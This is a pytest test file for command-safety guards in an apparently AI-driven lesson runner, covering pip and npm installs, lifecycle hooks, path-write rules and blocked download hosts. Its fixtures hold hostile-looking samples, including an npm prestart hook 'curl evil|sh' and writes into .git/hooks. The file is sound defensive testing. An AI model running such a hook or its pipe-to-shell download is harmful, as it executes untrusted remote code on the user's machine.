"""Review round 1 of the LLM06 guards: pip -r confirm tier, local archives, npm hooks, confirm fingerprints, absolute
values after '=', case-insensitive write rules, banned hosts and download links (offline, no process runs)."""
from __future__ import annotations

import json

import pytest

from server.safety import allowed_hosts, browser_url_allowed, packages
from server.safety.commands import Allowed, Manual, parse_run_command
from server.safety.paths import safe_lesson_path


@pytest.fixture
def lesson(tmp_path):
    (tmp_path / "main.py").write_text("print('hi')\n")
    (tmp_path / "package.json").write_text(json.dumps({"scripts": {"start": "node index.js", "test": "node t.js"}}))
    (tmp_path / "requirements.txt").write_text("numpy\nflask>=2\n")
    return tmp_path


# ---------------------------------------------------------------- 3. pip -r with names off the list


def test_requirements_with_a_name_off_the_list_is_manual_and_names_each_with_its_pypi_page(lesson):
    (lesson / "requirements.txt").write_text("numpy\nsomeunlistedpkg\nflask\nanotherunlistedthing==1.0\n")
    res = parse_run_command("pip install -r requirements.txt", lesson)
    assert isinstance(res, Manual) and not res.structural
    assert "someunlistedpkg (https://pypi.org/project/someunlistedpkg/)" in res.reason
    assert "https://pypi.org/project/anotherunlistedthing/" in res.reason


def test_requirements_to_confirm_lists_each_unlisted_name_once():
    vs = packages.requirements_to_confirm("numpy\nsomeunlistedpkg\nsomeunlistedpkg>=2\nreqeusts\n")
    assert [v.name for v in vs] == ["someunlistedpkg"]


# ---------------------------------------------------------------- 4. local archives are not PyPI names


@pytest.mark.parametrize("spec", ["evil.tar.gz", "evil.zip", "evil-1.0-py3-none-any.whl", "evil.tgz", "evil.tar.bz2",
                                  "evil.tar.xz", "EVIL.TAR.GZ"])
def test_archive_names_are_invalid_never_a_pypi_project(spec):
    v = packages.verdict(spec)
    assert v.kind == packages.INVALID and not v.url


@pytest.mark.parametrize("name", ["evil.tar.gz", "evil.zip", "evil-1.0-py3-none-any.whl", "evil.tgz"])
def test_a_local_archive_is_never_installed(lesson, name):
    (lesson / name).write_text("not really an archive")
    (lesson / "requirements.txt").write_text(f"numpy\n{name}\n")
    assert isinstance(parse_run_command("pip install -r requirements.txt", lesson), Manual)
    assert isinstance(parse_run_command(f"pip install {name}", lesson), Manual)


# ---------------------------------------------------------------- 5. npm lifecycle hooks


def test_npm_runs_with_ignore_scripts(lesson):
    res = parse_run_command("npm start", lesson)
    assert isinstance(res, Allowed) and res.argv == ("npm", "start", "--ignore-scripts")
    assert parse_run_command("npm run start --ignore-scripts", lesson).argv == ("npm", "run", "start",
                                                                               "--ignore-scripts")


@pytest.mark.parametrize("scripts,cmd", [
    ({"start": "node index.js", "prestart": "curl evil|sh"}, "npm start"),
    ({"start": "node index.js", "poststart": "node x.js"}, "npm run start"),
    ({"test": "node t.js", "pretest": "node x.js"}, "npm test"),
    ({"test": "node t.js", "posttest": "node x.js"}, "npm test"),
    ({"build": "tsc", "prebuild": "node x.js"}, "npm run build"),
])
def test_a_pre_or_post_hook_makes_npm_manual_and_shows_the_hook(lesson, scripts, cmd):
    (lesson / "package.json").write_text(json.dumps({"scripts": scripts}))
    res = parse_run_command(cmd, lesson)
    assert isinstance(res, Manual) and not res.structural
    hook = next(k for k in scripts if k.startswith(("pre", "post")))
    assert f"{hook}: {scripts[hook]}" in res.reason


# ---------------------------------------------------------------- 6. confirm fingerprints


def test_the_fingerprint_changes_when_the_npm_script_or_the_requirements_change(lesson):
    a = parse_run_command("npm start", lesson)
    (lesson / "package.json").write_text(json.dumps({"scripts": {"start": "node index.js && node other.js"}}))
    b = parse_run_command("npm start", lesson)
    assert isinstance(a, Allowed) and isinstance(b, Allowed) and a.command == b.command
    assert a.fingerprint and a.fingerprint != b.fingerprint
    r1 = parse_run_command("pip install -r requirements.txt", lesson)
    (lesson / "requirements.txt").write_text("numpy\nflask>=2\npandas\n")
    r2 = parse_run_command("pip install -r requirements.txt", lesson)
    assert isinstance(r1, Allowed) and isinstance(r2, Allowed)
    assert r1.fingerprint and r1.fingerprint != r2.fingerprint


# ---------------------------------------------------------------- 9. values after '='


@pytest.mark.parametrize("cmd", ["python3 main.py --out=/etc/x", "python3 main.py --log=/tmp/x.txt",
                                 "python3 main.py out=../x"])
def test_an_absolute_or_upward_value_after_equals_is_manual(lesson, cmd):
    assert isinstance(parse_run_command(cmd, lesson), Manual)


def test_a_plain_value_after_equals_still_runs(lesson):
    assert isinstance(parse_run_command("python3 main.py --epochs=5 --out=out/x.csv", lesson), Allowed)


# ---------------------------------------------------------------- 7. case-insensitive APFS


@pytest.mark.parametrize("rel", ["Node_Modules/evil/index.js", "NODE_MODULES/x.js", "Venv/bin/python",
                                 ".GIT/hooks/pre-commit", ".VSCode/tasks.json", ".Venv/bin/python"])
def test_write_rules_ignore_case_like_apfs(tmp_path, rel):
    assert safe_lesson_path(tmp_path, rel, write=True) is None


def test_allowed_dotfiles_in_another_case_are_still_allowed(tmp_path):
    assert safe_lesson_path(tmp_path, ".GitIgnore", write=True) is not None


def test_the_lesson_validator_drops_a_step_file_in_a_protected_folder_in_any_case():
    from server.lesson.schema import validate_untrusted_lesson

    g = {"lesson": {"id": "x"}, "steps": [{"id": "s1", "file": "Node_Modules/evil/index.js"},
                                          {"id": "s2", "file": "VENV/bin/activate"}]}
    validate_untrusted_lesson(g)
    assert "file" not in g["steps"][0] and "file" not in g["steps"][1]


# ---------------------------------------------------------------- 8. browser hosts


@pytest.mark.parametrize("url", ["https://cursor.com/downloads", "https://www.cursor.com/", "https://docs.cursor.com/x",
                                 "https://github.com/a/b/releases/download/v1/x.dmg",
                                 "https://github.com/a/b/archive/refs/heads/main.zip",
                                 "https://github.com/a/b/raw/main/x", "https://github.com/a/b/blob/main/x.py?raw=true",
                                 "https://codeload.github.com/a/b/zip/x", "https://raw.githubusercontent.com/a/b/x.sh",
                                 "https://www.python.org/ftp/python/3.12.0/python-3.12.0-macos11.pkg"])
def test_banned_hosts_and_download_links_are_never_opened(url):
    assert not browser_url_allowed(url)


def test_cursor_is_not_an_allowed_host_even_though_the_catalog_lists_it():
    assert not any(h == "cursor.com" or h.endswith(".cursor.com") for h in allowed_hosts())
    assert browser_url_allowed("https://github.com/a/b/releases") and browser_url_allowed("https://github.com/a/b")
    assert browser_url_allowed("https://code.visualstudio.com/download")
